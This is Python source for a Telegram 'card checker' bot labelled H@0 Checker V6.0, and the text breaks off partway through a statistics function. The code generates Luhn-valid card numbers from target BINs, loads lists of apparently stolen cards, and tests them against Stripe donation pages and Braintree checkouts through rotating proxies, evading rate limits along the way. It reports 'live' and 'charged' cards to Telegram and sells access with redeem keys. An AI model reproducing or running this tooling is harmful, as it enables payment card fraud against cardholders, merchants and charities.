import asyncio
import requests
import time
import aiogram
import os
import sys
import json
import random
import logging
import re

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

from aiohttp import ClientSession, ClientTimeout, TCPConnector
from faker import Faker
from aiogram import Bot, Dispatcher
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, Message, CallbackQuery
try:
    from keep_alive import live
except ImportError:
    def live():
        pass

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from proxy_scraper import full_scrape_and_scrub, auto_scrub_loop, get_scrub_stats, get_scrubbed_proxies, proxy_pool_monitor, get_live_count, remove_dead_proxy, get_proxy_latency, TARGET_LIVE, REFILL_THRESHOLD, MAX_WORKERS
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ADMIN_CODE, TELEGRAM_ADMIN, STRIPE_PUB_KEY, get_proxy_dict, load_proxies, get_proxy_stats, get_pool_size, blacklist_proxy, clear_blacklist, set_gate_setting, get_all_gate_settings, is_gate_enabled, set_gate_enabled, get_notify, set_notify, get_all_notify, set_custom_chat_id, get_custom_chat_id, is_proxy_enabled, set_proxy_enabled, add_custom_proxy, remove_custom_proxy, get_custom_proxies, clear_custom_proxies, has_custom_proxies, get_config, get_all_configs, get_active_config_id, set_active_config, create_config, duplicate_config, delete_config, enable_config, disable_config, set_config_setting, set_config_name, get_config_stats, update_config_stats, get_enabled_configs, is_parallel_enabled, set_parallel_enabled, config_count, generate_redeem_key, redeem_key, get_all_redeem_keys, revoke_redeem_key, is_user_redeemed, cleanup_expired_keys, add_admin, remove_admin, get_all_admins, is_extra_admin, get_config_gate_type, set_config_gate_type, get_gate_setting, track_user_card, get_user_cards, get_user_card_file, clear_user_cards, get_user_check_count, increment_user_check_count, check_user_card_limit, get_user_limit, set_user_limit, get_all_user_limits, export_config_data, import_config_data
from stripe import get_rate_limiter, diagnose_gate, setup_gate_from_url, detect_gate_type
from braintree_gate import check_braintree, setup_braintree_from_url
from smart_gen import init_smart_gen, generate_card_lstm, generate_smart_batch, retrain as retrain_smart_gen

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

fake = Faker()

SESSION_STATS = {
    'total_checked': 0,
    'total_live': 0,
    'total_dead': 0,
    'total_errors': 0,
    'stripe_checks': 0,
    'cycles': 0,
    'start_time': int(time.time()),
    'last_live_time': 0,
    'charged': 0,
}

_env_admin = ADMIN_CODE
_env_tgadmin = TELEGRAM_ADMIN
_raw_admin = _env_admin or _env_tgadmin
ADMIN_IDS = [aid.strip() for aid in _raw_admin.split(',') if aid.strip().isdigit()]
ADMIN_ID = ADMIN_IDS[0] if ADMIN_IDS else ''
logger.info(f"ADMIN_IDS loaded: {ADMIN_IDS} (ADMIN_CODE='{_env_admin}', TELEGRAM_ADMIN='{_env_tgadmin}')")
if not ADMIN_IDS:
    logger.warning("No valid ADMIN_IDs found! Check ADMIN_CODE or TELEGRAM_ADMIN secrets.")
bot_running = True
crawler_instance = None


def is_owner(user_id):
    try:
        uid = str(user_id)
        result = uid in ADMIN_IDS
        if not result:
            logger.info(f"Owner check failed: user_id='{user_id}' vs ADMIN_IDS={ADMIN_IDS}")
        return result
    except (ValueError, TypeError):
        return False


def is_admin(user_id, username=None):
    if is_owner(user_id):
        return True
    return is_extra_admin(user_id, username)


def is_authorized(user_id, username=None):
    if is_admin(user_id, username):
        return True
    ok, _ = is_user_redeemed(user_id)
    return ok


def luhn_algorithm(card_number):
    try:
        digits = [int(digit) for digit in card_number]
        for i in range(len(digits) - 2, -1, -2):
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
        return sum(digits) % 10 == 0
    except ValueError:
        return False


def validate_cvv(cvv, brand):
    if not cvv.isdigit():
        return False
    if brand in ('AMEX', 'AMERICAN EXPRESS'):
        return len(cvv) == 4
    return len(cvv) == 3


def validate_expiry(month, year):
    try:
        m = int(month)
        y = int(year) + 2000 if int(year) < 100 else int(year)
        if m < 1 or m > 12:
            return False
        from datetime import datetime
        now = datetime.now()
        if y < now.year or (y == now.year and m < now.month):
            return False
        return True
    except (ValueError, TypeError):
        return False


def get_card_brand(bin_str):
    if bin_str.startswith(('34', '37')):
        return 'AMEX'
    elif bin_str.startswith('4'):
        return 'VISA'
    elif bin_str.startswith(('51', '52', '53', '54', '55')):
        return 'MASTERCARD'
    elif bin_str.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
        return 'DISCOVER'
    else:
        return 'UNKNOWN'


async def safe_bin_info(crawler, bin6):
    try:
        if crawler:
            info = await crawler.get_bin_info(bin6)
        else:
            info = {}
    except Exception:
        info = {}
    brand_fallback = get_card_brand(bin6)
    return {
        'brand': info.get('brand', brand_fallback).upper() if info else brand_fallback,
        'type': info.get('type', 'CREDIT').upper() if info else 'CREDIT',
        'level': info.get('level', 'CLASSIC').upper() if info else 'CLASSIC',
        'bank': info.get('bank', 'UNKNOWN BANK').upper() if info else 'UNKNOWN BANK',
        'country_name': info.get('country_name', 'GLOBAL').upper() if info else 'GLOBAL',
        'country_flag': info.get('country_flag', '🌐') if info else '🌐',
    }


def _classify_auth_type(tag, detail):
    d = detail.lower()
    if tag == "CHARGED":
        return "CHARGED 💰", "Payment processed successfully"
    if any(s in d for s in ["3ds", "authentication", "requires_action"]):
        return "AUTH ✅", "Card authenticated (3DS required)"
    if "insufficient" in d:
        return "AUTH ✅", "Card live (insufficient funds)"
    if "cvv" in d or "cvc" in d or "security" in d:
        return "AUTH ✅", "Card live (CVV mismatch)"
    if "avs" in d or "zip" in d:
        return "AUTH ✅", "Card live (AVS mismatch)"
    if "velocity" in d or "limit" in d or "activity" in d:
        return "AUTH ✅", "Card live (rate limited by issuer)"
    if "restriction" in d or "master restriction" in d:
        return "AUTH ✅", "Card live (issuer restriction)"
    if "approve" in d and "id" in d:
        return "AUTH ✅", "Card live (needs approval with ID)"
    if tag == "LIVE":
        return "AUTH ✅", "Card validated and live"
    return "LIVE ✅", "Card accepted"


def _risk_level(detail):
    d = detail.lower()
    if any(s in d for s in ["charged", "processed", "donation processed", "payment accepted", "confirmation"]):
        return "🟢 LOW"
    if any(s in d for s in ["3ds", "authentication", "approve_with_id"]):
        return "🟡 MEDIUM"
    if any(s in d for s in ["insufficient", "cvv", "cvc", "avs", "velocity", "limit", "restriction"]):
        return "🟠 HIGH"
    return "🟢 LOW"


def fmt_live_msg(card_str, bin_info, gate_name, detail, proxy, tag="LIVE", cfg_label="", check_time=None):
    auth_type, auth_desc = _classify_auth_type(tag, detail)
    risk = _risk_level(detail)
    now_time = time.strftime('%I:%M %p')
    cc_parts = card_str.split('|')
    cc = cc_parts[0] if cc_parts else ""
    bin6 = cc[:6] if cc else "?"
    cvv = cc_parts[3] if len(cc_parts) > 3 else "?"
    brand = bin_info['brand']
    charge_icon = "💰" if tag == "CHARGED" else ("🔐" if "AUTH" in auth_type else "💎")
    time_str = f" in {check_time:.1f}s" if check_time else ""
    
    # Extract IP/Address info for telegram
    address_info = bin_info.get('country_name', 'GLOBAL')
    ip_info = "N/A"
    if proxy and ':' in proxy:
        ip_info = proxy.split(':')[0]
        
    return (
        f"{charge_icon} <b>H@0 ━ {auth_type}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>💳  CARD</b>\n"
        f"<code>{card_str}</code>\n"
        f"🎯 BIN <code>{bin6}</code> · {brand} · Luhn ✅\n"
        f"🔢 CVV <code>{len(cvv)}D</code> · Expiry ✅\n\n"
        f"<b>🏦  BIN INFO</b>\n"
        f"🏷 {brand} · {bin_info['type']} · {bin_info['level']}\n"
        f"🏦 {bin_info['bank']}\n"
        f"{bin_info['country_flag']} {bin_info['country_name']}\n\n"
        f"<b>📝  GATE RESPONSE</b>\n"
        f"🛡 <code>{gate_name}{cfg_label}</code>\n"
        f"💬 <code>{detail}</code>\n"
        f"📋 {auth_desc}\n"
        f"⚡ Risk: {risk}\n\n"
        f"<b>🌐  CONNECTION</b>\n"
        f"🔌 <code>{proxy}</code>\n"
        f"📍 Address: <code>{address_info}</code>\n"
        f"🌐 IP: <code>{ip_info}</code>\n"
        f"⏱ <code>{now_time}{time_str}</code>\n\n"
        f"<code>━━━ H@0 Checker V6.0 ━━━</code>"
    )


def _fmt_stripe_settings(settings, compact=False):
    site = settings.get('site_url', 'Not set')
    path = settings.get('donate_path', '/donate/')
    amount = settings.get('donation_amount', '1.00')
    rnd_on = settings.get('random_amount', False)
    rnd_min = settings.get('random_amount_min', '1.00')
    rnd_max = settings.get('random_amount_max', '5.00')
    raw_key = settings.get('pub_key', '')
    raw_acct = settings.get('stripe_account', '')
    raw_camp = settings.get('campaign_id', '')
    pk_len = 25 if compact else 20
    key_display = f"<code>{raw_key[:pk_len]}{'...' if len(raw_key) > pk_len else ''}</code>" if raw_key else "🤖 <i>Auto-detect</i>"
    acct_display = f"<code>{raw_acct[:pk_len]}{'...' if len(raw_acct) > pk_len else ''}</code>" if raw_acct else "🤖 <i>Auto-detect</i>"
    camp_display = f"<code>{raw_camp[:pk_len]}{'...' if len(raw_camp) > pk_len else ''}</code>" if raw_camp else "🤖 <i>Auto-detect</i>"
    amt_line = f"🎲  Amount: <code>${rnd_min}-${rnd_max}</code>{' (Random)' if not compact else ''}" if rnd_on else f"💰  Amount: <code>${amount}</code>"
    if compact:
        return (
            f"📄  Path: <code>{path}</code>\n"
            f"{amt_line}\n"
            f"🔑  Key: {key_display}\n"
            f"🏷  Acct: {acct_display}\n"
            f"📋  Campaign: {camp_display}\n"
        )
    rnd_icon = "🟢" if rnd_on else "🔴"
    hybrid_on = settings.get('hybrid_mode', False)
    hybrid_icon = "🟢" if hybrid_on else "🔴"
    return (
        f"🌐  Site URL:\n"
        f"     <code>{site}</code>\n"
        f"📄  Donate Path: <code>{path}</code>\n"
        f"{amt_line}\n"
        f"{rnd_icon}  Random Amount: <b>{'ON' if rnd_on else 'OFF'}</b>\n"
        f"{hybrid_icon}  Hybrid Mode: <b>{'ON' if hybrid_on else 'OFF'}</b>\n"
        f"🔑  Pub Key: {key_display}\n"
        f"🏷  Account: {acct_display}\n"
        f"📋  Campaign: {camp_display}\n"
    )


def _fmt_braintree_settings(settings, compact=False):
    site = settings.get('site_url', 'Not set')
    cart_path = settings.get('add_to_cart_path', '/orders/populate')
    checkout_path = settings.get('checkout_path', '/checkout/onepage')
    pay_method = settings.get('payment_method_id', '3')
    hybrid = settings.get('hybrid_mode', False)
    h_icon = "🟢" if hybrid else "🔴"
    if compact:
        return (
            f"🛒  Cart: <code>{cart_path}</code>\n"
            f"💳  Checkout: <code>{checkout_path}</code>\n"
            f"🆔  Pay Method: <code>{pay_method}</code>\n"
            f"{h_icon}  Hybrid: <code>{'ON' if hybrid else 'OFF'}</code>\n"
        )
    return (
        f"🌐  Site URL:\n"
        f"     <code>{site}</code>\n"
        f"🛒  Cart Path: <code>{cart_path}</code>\n"
        f"💳  Checkout: <code>{checkout_path}</code>\n"
        f"🆔  Pay Method: <code>{pay_method}</code>\n"
        f"{h_icon}  Hybrid: <code>{'ON' if hybrid else 'OFF'}</code>\n"
    )


def _fmt_gate_settings(settings, gate_type, compact=False):
    if gate_type == "braintree":
        return _fmt_braintree_settings(settings, compact)
    return _fmt_stripe_settings(settings, compact)


def _decline_reason(detail):
    d = detail.lower()
    if "stolen" in d:
        return "🚫 Card reported stolen by issuer"
    if "lost" in d:
        return "🚫 Card reported lost by issuer"
    if "fraud" in d:
        return "🚫 Flagged as fraudulent"
    if "expired" in d:
        return "📅 Card has expired"
    if "invalid" in d and "number" in d:
        return "🔢 Card number is invalid"
    if "do_not_honor" in d or "issuer" in d:
        return "🏦 Issuer refused transaction"
    if "restricted" in d:
        return "🔒 Card is restricted"
    if "pickup" in d:
        return "🚫 Card flagged for pickup"
    if "test" in d:
        return "🧪 Test card rejected"
    if "processor" in d:
        return "⚙️ Processor declined"
    if "not_allowed" in d or "not_permitted" in d:
        return "🚫 Transaction type not allowed"
    if "currency" in d:
        return "💱 Currency not supported"
    if "call_issuer" in d or "call" in d:
        return "📞 Issuer requires verification"
    if "pin" in d:
        return "🔑 PIN error"
    return "❌ Card was declined by issuer"


def _fmt_status_msg(icon, status_label, card_str, cc, cvv, bin_info, gate_name, detail, proxy, cfg_label="", check_time=None):
    now_time = time.strftime('%I:%M %p')
    time_str = f" · {check_time:.1f}s" if check_time else ""
    gate_ok = "gate error" not in detail.lower() and "error" not in detail.lower()[:15]
    gate_indicator = "✅" if gate_ok else "⚠️"
    reason = _decline_reason(detail) if status_label == "DECLINED" else ""
    reason_line = f"📋 {reason}\n" if reason else ""
    return (
        f"{icon} <b>H@0 ━ {status_label}{cfg_label}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>💳  CARD</b>\n"
        f"<code>{card_str}</code>\n"
        f"🎯 BIN <code>{cc[:6]}</code> · {bin_info['brand']} · Luhn ✅\n"
        f"🔢 CVV <code>{len(cvv)}D</code> · Expiry ✅\n\n"
        f"<b>🏦  BIN INFO</b>\n"
        f"🏷 {bin_info['brand']} · {bin_info['type']} · {bin_info['level']}\n"
        f"🏦 {bin_info['bank']}\n"
        f"{bin_info['country_flag']} {bin_info['country_name']}\n\n"
        f"<b>📝  GATE RESPONSE</b>\n"
        f"🛡 <code>{gate_name}</code> {gate_indicator}\n"
        f"💬 <code>{detail}</code>\n"
        f"{reason_line}"
        f"<b>🌐  CONNECTION</b>\n"
        f"🔌 <code>{proxy}</code>\n"
        f"⏱ <code>{now_time}{time_str}</code>\n\n"
        f"<code>━━━ H@0 Checker V6.0 ━━━</code>"
    )


def fmt_dead_msg(card_str, cc, cvv, bin_info, gate_name, detail, proxy, cfg_label="", check_time=None):
    return _fmt_status_msg("❌", "DECLINED", card_str, cc, cvv, bin_info, gate_name, detail, proxy, cfg_label, check_time)


def fmt_error_msg(card_str, cc, cvv, bin_info, gate_name, detail, proxy, err_type="ERROR", cfg_label="", check_time=None):
    return _fmt_status_msg("⚠️", err_type, card_str, cc, cvv, bin_info, gate_name, detail, proxy, cfg_label, check_time)


def fmt_chk_live(card_str, cc, bin_info, gate_name, detail, proxy, tag="LIVE", check_time=None):
    auth_type, auth_desc = _classify_auth_type(tag, detail)
    risk = _risk_level(detail)
    now_time = time.strftime('%I:%M %p')
    charge_icon = "💰" if tag == "CHARGED" else ("🔐" if "AUTH" in auth_type else "✅")
    gate_ok = "Gate Error" not in detail and "error" not in detail.lower()[:20]
    gate_indicator = "✅ WORKING" if gate_ok else "⚠️ Issue"
    time_str = f" · {check_time:.1f}s" if check_time else ""
    cvv = card_str.split('|')[3] if len(card_str.split('|')) > 3 else "?"
    
    # Extract IP/Address info for telegram
    address_info = bin_info.get('country_name', 'GLOBAL')
    ip_info = "N/A"
    if proxy and ':' in proxy:
        ip_info = proxy.split(':')[0]

    return (
        f"{charge_icon} <b>H@0 ━ {auth_type}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>💳  CARD</b>\n"
        f"<code>{card_str}</code>\n"
        f"🎯 BIN <code>{cc[:6]}</code> · {bin_info['brand']} · Luhn ✅\n"
        f"🔢 CVV <code>{len(cvv)}D</code> · Expiry ✅\n\n"
        f"<b>🏦  BIN INFO</b>\n"
        f"🏷 {brand} · {bin_info['type']} · {bin_info['level']}\n"
        f"🏦 {bin_info['bank']}\n"
        f"{bin_info['country_flag']} {bin_info['country_name']}\n\n"
        f"<b>📝  GATE RESPONSE</b>\n"
        f"🛡 <code>{gate_name}</code> · {gate_indicator}\n"
        f"💬 <code>{detail}</code>\n"
        f"📋 {auth_desc}\n"
        f"⚡ Risk: {risk}\n\n"
        f"<b>🌐  CONNECTION</b>\n"
        f"🔌 <code>{proxy}</code>\n"
        f"📍 Address: <code>{address_info}</code>\n"
        f"🌐 IP: <code>{ip_info}</code>\n"
        f"⏱ <code>{now_time}{time_str}</code>\n\n"
        f"<code>━━━ H@0 Checker V6.0 ━━━</code>"
    )


def fmt_chk_dead(card_str, cc, bin_info, gate_name, detail, proxy, check_time=None):
    now_time = time.strftime('%I:%M %p')
    gate_ok = "Gate Error" not in detail and "error" not in detail.lower()[:20]
    gate_indicator = "✅ WORKING" if gate_ok else "⚠️ Issue"
    time_str = f" · {check_time:.1f}s" if check_time else ""
    reason = _decline_reason(detail)
    cvv = card_str.split('|')[3] if len(card_str.split('|')) > 3 else "?"
    
    # Extract IP/Address info for telegram
    address_info = bin_info.get('country_name', 'GLOBAL')
    ip_info = "N/A"
    if proxy and ':' in proxy:
        ip_info = proxy.split(':')[0]

    return (
        f"❌ <b>H@0 ━ DECLINED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>💳  CARD</b>\n"
        f"<code>{card_str}</code>\n"
        f"🎯 BIN <code>{cc[:6]}</code> · {bin_info['brand']} · Luhn ✅\n"
        f"🔢 CVV <code>{len(cvv)}D</code> · Expiry ✅\n\n"
        f"<b>🏦  BIN INFO</b>\n"
        f"🏷 {bin_info['brand']} · {bin_info['type']} · {bin_info['level']}\n"
        f"🏦 {bin_info['bank']}\n"
        f"{bin_info['country_flag']} {bin_info['country_name']}\n\n"
        f"<b>📝  GATE RESPONSE</b>\n"
        f"🛡 <code>{gate_name}</code> · {gate_indicator}\n"
        f"💬 <code>{detail}</code>\n"
        f"📋 {reason}\n\n"
        f"<b>🌐  CONNECTION</b>\n"
        f"🔌 <code>{proxy}</code>\n"
        f"📍 Address: <code>{address_info}</code>\n"
        f"🌐 IP: <code>{ip_info}</code>\n"
        f"⏱ <code>{now_time}{time_str}</code>\n\n"
        f"<code>━━━ H@0 Checker V6.0 ━━━</code>"
    )


def full_card_check(card_str):
    parts = card_str.split('|')
    if len(parts) < 4:
        return False, "Invalid format"

    cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]

    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return False, "Invalid card number length"

    if not luhn_algorithm(cc):
        return False, "Failed Luhn check"

    brand = get_card_brand(cc[:6])

    if not validate_cvv(cvv, brand):
        return False, f"Invalid CVV for {brand}"

    if not validate_expiry(month, year):
        return False, "Expired or invalid date"

    return True, "Passed all checks"


def format_uptime(start_time):
    elapsed = int(time.time()) - start_time
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    return f"{hours}h {minutes}m"


def is_valid_bin_input(bin_str):
    if len(bin_str) < 4:
        return False, "BIN must be at least 4 characters"
    if len(bin_str) > 16:
        return False, "BIN must be 16 characters or less"
    digit_count = sum(1 for c in bin_str if c.isdigit())
    if digit_count < 4:
        return False, "BIN must have at least 4 real digits"
    for c in bin_str:
        if c not in '0123456789xX':
            return False, f"Invalid character '{c}' - use digits and 'x' only"
    return True, "Valid"


def normalize_bin(bin_str):
    return bin_str.lower().replace('X', 'x')


class CCCrawler:

    def __init__(self):
        self.bins_file = os.path.join(BASE_DIR, "bin.txt")
        self.cc_file = os.path.join(BASE_DIR, "livescc.txt")
        self.bins = self.load_bins()
        self.cc_list = self.load_cc_file()
        self.cc_index = 0
        self.timeout = ClientTimeout(total=15)
        self._gate_errors = 0
        self._consecutive_errors = 0
        self._last_bt_proxy = None
        self._smart_gen_ready = False
        self._smart_gen_live_count = 0

    def load_cc_file(self):
        cards = []
        try:
            if os.path.exists(self.cc_file):
                with open(self.cc_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        parts = line.split('|')
                        if len(parts) >= 4 and len(parts[0]) >= 13:
                            cards.append(line)
                if cards:
                    logger.info(f"Loaded {len(cards)} cards from {self.cc_file}")
        except Exception as e:
            logger.error(f"Error loading cc file: {e}")
        return cards

    def reload_cc_file(self):
        self.cc_list = self.load_cc_file()
        self.cc_index = 0
        return len(self.cc_list)

    def load_bins(self):
        try:
            if os.path.exists(self.bins_file):
                with open(self.bins_file, 'r') as f:
                    bins = []
                    for line in f:
                        b = line.strip().lower()
                        if not b:
                            continue
                        if all(c in '0123456789x' for c in b) and len(b) >= 4:
                            digit_count = sum(1 for c in b if c.isdigit())
                            if digit_count >= 4:
                                bins.append(b)
                    if bins:
                        bins = list(set(bins))
                        logger.info(f"Loaded {len(bins)} unique target BINs from {self.bins_file}")
                        return bins
        except Exception as e:
            logger.error(f"Error loading bins: {e}")

        logger.warning("Using fallback BINs")
        return [
            "457620", "411079", "529074", "417984", "472357", "541590",
            "406587", "435660", "374295"
        ]

    def save_bins(self):
        try:
            with open(self.bins_file, 'w') as f:
                for b in sorted(set(self.bins)):
                    f.write(b + '\n')
            logger.info(f"Saved {len(self.bins)} BINs to {self.bins_file}")
        except Exception as e:
            logger.error(f"Error saving bins: {e}")

    def add_bin(self, bin_str):
        normalized = normalize_bin(bin_str)
        if normalized not in self.bins:
            self.bins.append(normalized)
            self.save_bins()
            return True
        return False

    def remove_bin(self, bin_str):
        normalized = normalize_bin(bin_str)
        if normalized in self.bins:
            self.bins.remove(normalized)
            self.save_bins()
            return True
        return False

    async def check_stripe(self, card_str):
        try:
            parts = card_str.split('|')
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            from stripe import check_stripe
            loop = asyncio.get_event_loop()
            t0 = time.time()
            result = await loop.run_in_executor(None, check_stripe, cc, mes, ano, cvv)
            elapsed = time.time() - t0

            status = result.get('status', 'declined')
            detail = result.get('detail', 'Unknown')
            gate_name = result.get('gate', 'Stripe Charitable')

            SESSION_STATS['stripe_checks'] += 1

            if status == 'error':
                self._gate_errors += 1
                return False, "ERROR", detail, gate_name, elapsed

            self._gate_errors = 0

            if status in ('live', 'charged'):
                tag = "CHARGED" if status == 'charged' else "LIVE"
                return True, tag, detail, gate_name, elapsed
            return False, "DEAD", detail, gate_name, elapsed
        except Exception as e:
            self._gate_errors += 1
            logger.error(f"Stripe Error: {str(e)[:80]}")
        return False, "ERROR", "Gate Error", "Stripe Charitable", 0.0

    async def check_braintree_gate(self, card_str):
        try:
            parts = card_str.split('|')
            cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
            loop = asyncio.get_event_loop()
            t0 = time.time()
            result = await loop.run_in_executor(None, check_braintree, cc, mes, ano, cvv)
            elapsed = time.time() - t0

            status = result.get('status', 'declined')
            detail = result.get('detail', 'Unknown')
            gate_name = result.get('gate', 'Braintree')
            self._last_bt_proxy = result.get('proxy_used', None)

            if status == 'error':
                self._gate_errors += 1
                return False, "ERROR", detail, gate_name, elapsed

            self._gate_errors = 0

            if status in ('live', 'charged'):
                tag = "CHARGED" if status == 'charged' else "LIVE"
                return True, tag, detail, gate_name, elapsed
            return False, "DEAD", detail, gate_name, elapsed
        except Exception as e:
            self._gate_errors += 1
            logger.error(f"Braintree Error: {str(e)[:80]}")
        return False, "ERROR", "Gate Error", "Braintree", 0.0

    async def check_card(self, card_str, gate_type="stripe"):
        if self._gate_errors >= 5:
            self._gate_errors = 0
            logger.warning(f"{gate_type} gate errors high - resetting + cooldown 15s")
            await asyncio.sleep(15)

        proxy_used = None
        check_time = 0.0
        if gate_type == "braintree":
            from braintree_gate import get_bt_rate_limiter
            bt_rl = get_bt_rate_limiter()
            bt_stats = bt_rl.get_stats()
            if bt_stats.get('is_banned'):
                logger.warning("BT rate limiter: API is banned, waiting...")
                while bt_rl.get_stats().get('is_banned'):
                    await asyncio.sleep(5)

            is_live, tag, detail, gate_name, check_time = await self.check_braintree_gate(card_str)
            proxy_used = getattr(self, '_last_bt_proxy', None)

            backoff = bt_rl.get_stats().get('backoff_level', 0)
            base_delay = random.uniform(2.0, 4.0)
            extra_delay = backoff * random.uniform(0.5, 1.5)
            await asyncio.sleep(base_delay + extra_delay)
        else:
            proxy_dict = get_proxy_dict()
            if proxy_dict:
                proxy_used = proxy_dict.get('http', '').replace('http://', '').replace('https://', '')

            rl = get_rate_limiter()
            rl_stats = rl.get_stats()
            if rl_stats.get('is_banned'):
                logger.warning("Rate limiter: API is banned, waiting...")
                while rl.get_stats().get('is_banned'):
                    await asyncio.sleep(5)

            is_live, tag, detail, gate_name, check_time = await self.check_stripe(card_str)

            backoff = rl.get_stats().get('backoff_level', 0)
            base_delay = random.uniform(2.0, 4.0)
            extra_delay = backoff * random.uniform(0.5, 1.5)
            await asyncio.sleep(base_delay + extra_delay)

        return is_live, tag, detail, gate_name, proxy_used, check_time

    def _expand_bin_pattern(self, bin_str):
        result = []
        for c in bin_str:
            if c == 'x':
                result.append(str(random.randint(0, 9)))
            else:
                result.append(c)
        return ''.join(result)

    def _generate_luhn_card(self, bin_str, length):
        if 'x' in bin_str:
            expanded = self._expand_bin_pattern(bin_str)
            digits = [int(d) for d in expanded]
        else:
            digits = [int(d) for d in bin_str]

        while len(digits) < length - 1:
            digits.append(random.randint(0, 9))

        if len(digits) > length - 1:
            digits = digits[:length - 1]

        total = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 0:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        check_digit = (10 - (total % 10)) % 10
        digits.append(check_digit)
        return "".join(map(str, digits))

    def _smart_expiry(self):
        from datetime import datetime
        now = datetime.now()
        future_months = random.randint(3, 60)
        m = ((now.month - 1 + future_months) % 12) + 1
        y = now.year + ((now.month - 1 + future_months) // 12)
        return str(m).zfill(2), str(y % 100)

    def _init_smart_gen_bg(self):
        if not self._smart_gen_ready:
            try:
                init_smart_gen()
                self._smart_gen_ready = True
                logger.info("LSTM smart generator initialized")
            except Exception as e:
                logger.warning(f"Smart gen init failed: {e}, using random gen")

    async def crawl_batch(self):
        batch = []
        batch_size = random.randint(30, 50)

        if not self._smart_gen_ready:
            self._init_smart_gen_bg()

        pure_bins = []
        for b in self.bins:
            pure = b.replace('x', '')
            pure_bins.append((b, pure))

        visa_bins = [b for b, p in pure_bins if p.startswith('4')]
        mc_bins = [b for b, p in pure_bins if p.startswith('5')]
        amex_bins = [b for b, p in pure_bins if p.startswith(('34', '37'))]
        disc_bins = [b for b, p in pure_bins if p.startswith(('6'))]

        brand_pools = []
        if visa_bins:
            brand_pools.append(('VISA', visa_bins, 50))
        if mc_bins:
            brand_pools.append(('MC', mc_bins, 30))
        if amex_bins:
            brand_pools.append(('AMEX', amex_bins, 10))
        if disc_bins:
            brand_pools.append(('DISC', disc_bins, 10))

        for _ in range(batch_size):
            roll = random.randint(1, 100)
            cumulative = 0
            chosen_pool = self.bins
            for brand_name, pool, weight in brand_pools:
                cumulative += weight
                if roll <= cumulative:
                    chosen_pool = pool
                    break

            bin_choice = random.choice(chosen_pool)
            pure_bin = bin_choice.replace('x', '')
            is_amex = pure_bin.startswith(('34', '37'))
            cvv_len = 4 if is_amex else 3

            if self._smart_gen_ready and random.random() < 0.7:
                card_str_final = generate_card_lstm(bin_choice)
            else:
                card_len = 15 if is_amex else 16
                card_str_final = self._generate_luhn_card(bin_choice, card_len)

            if not card_str_final or not luhn_algorithm(card_str_final):
                continue

            month, year = self._smart_expiry()
            cvv = "".join([str(random.randint(0, 9)) for _ in range(cvv_len)])

            full_card = f"{card_str_final}|{month}|{year}|{cvv}"
            is_valid, reason = full_card_check(full_card)
            if is_valid:
                batch.append(full_card)

        logger.info(f"Generated {len(batch)} valid cards from {batch_size} attempts (LSTM={'ON' if self._smart_gen_ready else 'OFF'})")
        return batch

    async def get_bin_info(self, bin_number):
        sources = [
            f"https://bins.antipublic.cc/bins/{bin_number}",
            f"https://lookup.binlist.net/{bin_number}",
        ]

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }

        for url in sources:
            try:
                connector = TCPConnector(ssl=False)
                async with ClientSession(timeout=ClientTimeout(total=5), headers=headers, connector=connector) as session:
                    async with session.get(url) as response:
                        if response.status == 200:
                            data = await response.json()
                            brand = (data.get('scheme') or data.get('brand') or data.get('card_brand') or 'GENERIC').upper()
                            type_val = (data.get('type') or data.get('card_type') or 'CREDIT').upper()
                            level = (data.get('brand') or data.get('level') or data.get('card_category') or 'CLASSIC').upper()
                            bank = (data.get('bank', {}).get('name') if isinstance(data.get('bank'), dict) else data.get('bank') or data.get('bank_name') or 'UNKNOWN BANK')
                            if isinstance(bank, str):
                                bank = bank.upper()
                            else:
                                bank = 'UNKNOWN BANK'
                            country = 'GLOBAL'
                            flag = '🌐'
                            if isinstance(data.get('country'), dict):
                                country = (data['country'].get('name') or 'GLOBAL').upper()
                                flag = data['country'].get('emoji') or '🌐'
                            elif isinstance(data.get('country_name'), str):
                                country = data['country_name'].upper()

                            return {
                                'brand': brand,
                                'type': type_val,
                                'level': level,
                                'bank': bank,
                                'country_name': country,
                                'country_flag': flag
                            }
                        elif response.status == 429:
                            continue
            except Exception:
                continue
        return {}


async def send_stats_to_channel(bot, chat_id):
    proxy_stats = get_proxy_stats()
    scrub_stats = get_scrub_stats()
    rl = get_rate_limiter()
    rl_stats = rl.get_stats()
    uptime = format_uptime(SESSION_STATS['start_time'])
    hit_rate = "0%"
    if SESSION_STATS['total_checked'] > 0:
        hit_rate = f"{(SESSION_STATS['total_live'] / SESSION_STATS['total_checked']) * 100:.2f}%"

    checked = SESSION_STATS['total_checked']
    approved = SESSION_STATS['total_live']
    charged = SESSION_STATS['charged']
    declined = SESSION_STATS['total_dead']
    errors = SESSION_STATS['total_errors']
    cycles = SESSION_STATS['cycles']
    pool = get_pool_size()
    scrubbed_live = scrub_stats.get('total_live', 0)
    blacklisted = proxy_stats.get('blacklisted', 0)
    rpm = rl_stats.get('requests_in_window', 0)
    backoff = rl_stats.get('backoff_level', 0)
    rate_limits_count = rl_stats.get('rate_limits', 0)
    bans_count = rl_stats.get('bans', 0)

    bar_len = 10
    if checked > 0:
        live_pct = approved / checked
        bar_fill = round(live_pct * bar_len)
    else:
        live_pct = 0
        bar_fill = 0
